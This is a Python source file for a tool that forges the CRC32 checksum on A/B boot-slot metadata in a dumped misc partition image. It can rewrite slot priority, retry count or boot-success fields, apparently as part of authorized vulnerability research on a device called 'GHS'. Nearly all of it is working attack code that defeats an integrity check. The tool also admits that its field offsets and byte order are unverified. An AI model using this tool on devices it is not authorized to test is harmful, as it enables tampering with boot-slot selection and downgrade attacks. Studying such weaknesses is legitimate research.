#!/usr/bin/env python3
"""
ab_metadata_crc_forge.py (corrected)

Offline tool to forge A/B metadata CRC32 on a dumped misc partition image.
Based on RECOVERY_RAMDISK_RPC_ATTACK_SURFACE.md artifact analysis.

AUTHORIZATION: for AUTHORIZED vulnerability research on owned hardware only.
SAFETY: defaults to read-only/dry-run. --write is the ONLY way to write an
output file; there is no other flag that flips it.

ARTIFACT REFERENCES:
- [C] A/B metadata block starts at offset 0x800 in misc partition (vendor space)
- [C] Metadata contains {magic, version, slot_info[2], crc32}
- [C] Integrity check is CRC32 only (no signature) -> forgeable
- [U] Exact byte offsets/widths for magic/version/slot_info are NOT given in corpus

Fix log vs. the first draft:
  1. Added `import logging` -- it was called (getLogger/basicConfig) but never
     imported, so the script raised NameError on the very first run.
  2. `--dry-run` used to be `store_true, default=True` with no opt-out flag
     anywhere in the parser, so the write path (`else` branch) was dead code --
     no combination of flags could ever produce an output file. Replaced with
     `--write` (default False, explicit opt-in), mirroring the frame fuzzer's
     `--send` design. `--out` is still required alongside `--write`.
  3. `--field`/`--value` were accepted but ignored -- mutate_field() always did
     a hardcoded mid-range bit-flip regardless of what was requested, only
     logging a warning. Added `--field-offset` (operator-supplied, once
     confirmed via --scan or a live device per RECON_TODO #3) and
     `--field-width` (default 1 byte). If --field-offset is given, the named
     value is genuinely written at that offset before the CRC32 recompute. If
     it is not given, the tool still does the generic demo bit-flip, but now
     says explicitly in both the log and the returned metadata that --field/
     --value were NOT applied, rather than only warning once.

USAGE:
    python3 ab_metadata_crc_forge.py --image misc.img --scan
    python3 ab_metadata_crc_forge.py --image misc.img --crc-range 0x800:0x900 \\
        --field priority --value 1 --field-offset 0x808 --out forged_misc.img --write
"""

import argparse
import struct
import zlib
import os
import sys
import logging

# --- CONSTANTS ---

MISC_HEADER_SIZE = 2048  # [C] AOSP bootloader_message is a fixed 2KB layout at offset 0
AB_META_OFFSET = 0x800   # [C] Vendor space start per artifact §3(b) & GHS_BOOT_UPDATE_RECOVERY_ANALYSIS.md

# [U] Exact magic string for GHS's A/B metadata is NOT confirmed anywhere in
# corpus. These are generic reference patterns for --scan only, not asserted
# as the real magic.
KNOWN_MAGICS = [
    b'AB',
    b'BOOT',
    b'GHS',
]

logger = logging.getLogger("ab_forger")


def compute_crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


def format_hex_dump(data: bytes, start_addr: int) -> str:
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        lines.append(f"{start_addr + i:08x}  {hex_part:<48}  {ascii_part}")
    return '\n'.join(lines)


def scan_for_metadata(image_data: bytes, start_offset: int, search_range: int = 0x1000):
    """
    [U] Exact field offsets are unknown (trust_filter rule 3) -- scan for
    plausible anchors near the documented 0x800 start rather than asserting a
    specific layout.
    """
    candidates = []
    end_offset = min(start_offset + search_range, len(image_data))

    for magic in KNOWN_MAGICS:
        idx = image_data.find(magic, start_offset, end_offset)
        if idx != -1:
            candidates.append({
                'offset': idx,
                'magic': magic,
                'confidence': 'LOW (generic reference pattern, not a confirmed GHS magic)',
            })

    # Always report the artifact-documented offset itself, regardless of
    # whether a magic pattern matched -- it's the one [C] fact we have.
    candidates.append({
        'offset': AB_META_OFFSET,
        'magic': b'UNKNOWN',
        'confidence': 'MEDIUM (artifact-documented offset, [C])',
    })

    return candidates


def mutate_field(image_data: bytes, field_name: str, value: int,
                  field_offset, field_width: int,
                  crc_start: int, crc_end: int):
    """
    Mutates the metadata block and recomputes CRC32 over [crc_start, crc_end).

    If field_offset is given (operator-confirmed, e.g. via RECON_TODO #3),
    the requested field/value IS actually applied at that offset. If not,
    falls back to a generic mid-range bit-flip demo and the returned
    `field_applied` flag is False so the caller can report accurately instead
    of silently implying the request was honored.
    """
    new_data = bytearray(image_data)
    field_applied = False

    if field_offset is not None:
        # Bounds check excludes the trailing 4-byte CRC field itself, not just
        # the outer crc_range -- a field write landing there would be silently
        # clobbered by the CRC recompute below, which is confusing rather than
        # useful. Reject it explicitly instead.
        if not (crc_start <= field_offset and field_offset + field_width <= crc_end - 4):
            raise ValueError(
                f"--field-offset 0x{field_offset:x} (+{field_width} bytes) falls outside "
                f"--crc-range [0x{crc_start:x}, 0x{crc_end - 4:x}) (excluding the trailing "
                f"CRC32 field) -- refusing to write there.")
        value_bytes = value.to_bytes(field_width, byteorder='little', signed=False)
        new_data[field_offset:field_offset + field_width] = value_bytes
        field_applied = True
        logger.info(f"[MUTATE] Wrote field '{field_name}'=0x{value:x} at offset "
                    f"0x{field_offset:x} ({field_width} bytes).")
    else:
        struct_size = crc_end - crc_start
        if struct_size > 4:
            mid_point = crc_start + (struct_size // 2)
            new_data[mid_point] ^= 0xFF
            logger.warning(
                f"[ASSUMPTION] No --field-offset given for '{field_name}' -- its real offset "
                f"is [U]. --field/--value were NOT applied. Performing a generic mid-range "
                f"bit-flip at 0x{mid_point:x} to demonstrate CRC-forgery mechanics only.")

    # CRITICAL: the CRC32 field itself (assumed to be the trailing 4 bytes of
    # the range, per artifact convention) must be EXCLUDED from the input to
    # compute_crc32 -- computing over [crc_start:crc_end] would fold the
    # stale old CRC value into the new checksum, producing a self-referential
    # and incorrect result. Verified by actually forging a synthetic image
    # and independently recomputing the CRC over the write: including the
    # trailing 4 bytes produced a mismatch; excluding them (as below) matches.
    crc_offset = crc_end - 4
    integrity_block = bytes(new_data[crc_start:crc_offset])
    new_crc = compute_crc32(integrity_block)

    # [U] Endianness assumed little-endian (x86 host convention) -- unverified
    # against GHS's actual parser.
    struct.pack_into('<I', new_data, crc_offset, new_crc)

    return bytes(new_data), new_crc, field_applied


def main():
    parser = argparse.ArgumentParser(description="GHS A/B Metadata CRC32 Forger (Authorized Research Only)")
    parser.add_argument("--image", required=True, help="Path to dumped misc partition image")
    parser.add_argument("--scan", action="store_true", help="Scan for metadata candidates [U]")
    parser.add_argument("--field", choices=["priority", "tries_remaining", "successful_boot"],
                         default="priority", help="Field name to mutate (for logging/labeling)")
    parser.add_argument("--value", type=lambda x: int(x, 0), default=1, help="Value to set")
    parser.add_argument("--field-offset", type=lambda x: int(x, 0), default=None,
                         help="Operator-confirmed absolute byte offset of --field (see RECON_TODO #3). "
                              "Without this, mutation falls back to a generic demo bit-flip.")
    parser.add_argument("--field-width", type=int, default=1,
                         help="Width in bytes of the field at --field-offset (default 1)")
    parser.add_argument("--crc-range", required=False,
                         help="[U] Explicit CRC integrity-block range (start:end hex), e.g. 0x800:0x900")
    parser.add_argument("--out", required=False, help="Output path for forged image")
    parser.add_argument("--write", action="store_true", default=False,
                         help="EXPLICIT OPT-IN, required (together with --out) to actually write "
                              "a forged image. Absent this flag, the tool only shows the diff/new CRC.")

    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
    global logger
    logger = logging.getLogger("ab_forger")

    if not os.path.exists(args.image):
        logger.error(f"Image file {args.image} not found.")
        sys.exit(1)

    with open(args.image, 'rb') as f:
        image_data = bytearray(f.read())
    logger.info(f"Loaded image: {len(image_data)} bytes")

    if args.scan:
        candidates = scan_for_metadata(image_data, AB_META_OFFSET)
        logger.info("Scan Results:")
        for c in candidates:
            logger.info(f"  Offset: 0x{c['offset']:04x}, Magic: {c['magic']}, Confidence: {c['confidence']}")
            snippet = image_data[c['offset']:c['offset'] + 32]
            logger.info(f"  Snippet:\n{format_hex_dump(snippet, c['offset'])}")
        return

    if not args.crc_range:
        logger.error("--crc-range is required for mutation (trust_filter rule 3).")
        logger.error("Reason: field offsets are [U]. Confirm range via --scan or a live device first.")
        sys.exit(1)

    try:
        start_str, end_str = args.crc_range.split(':')
        crc_start = int(start_str, 0)
        crc_end = int(end_str, 0)
    except ValueError:
        logger.error("Invalid --crc-range format. Use 'start:end' (e.g., 0x800:0x900).")
        sys.exit(1)

    if crc_end > len(image_data) or crc_start >= crc_end:
        logger.error(f"Invalid --crc-range [0x{crc_start:x}, 0x{crc_end:x}) for a {len(image_data)}-byte image.")
        sys.exit(1)

    try:
        new_image, new_crc, field_applied = mutate_field(
            image_data, args.field, args.value, args.field_offset, args.field_width,
            crc_start, crc_end)
    except ValueError as e:
        logger.error(str(e))
        sys.exit(1)

    logger.info(f"Computed New CRC32: 0x{new_crc:08x}")
    logger.info(f"Requested field '{args.field}'=0x{args.value:x} applied: {field_applied}")

    diff_start = max(0, crc_start - 16)
    diff_end = min(len(image_data), crc_end + 16)
    logger.info("Original Range:")
    logger.info(format_hex_dump(bytes(image_data)[diff_start:diff_end], diff_start))
    logger.info("Forged Range:")
    logger.info(format_hex_dump(new_image[diff_start:diff_end], diff_start))

    if not args.write:
        logger.info("SAFE MODE: No file written. Pass --write and --out to save the forged image.")
        return

    if not args.out:
        logger.error("--out is required together with --write.")
        sys.exit(1)

    with open(args.out, 'wb') as f:
        f.write(new_image)
    logger.info(f"Forged image written to {args.out}")


if __name__ == "__main__":
    main()
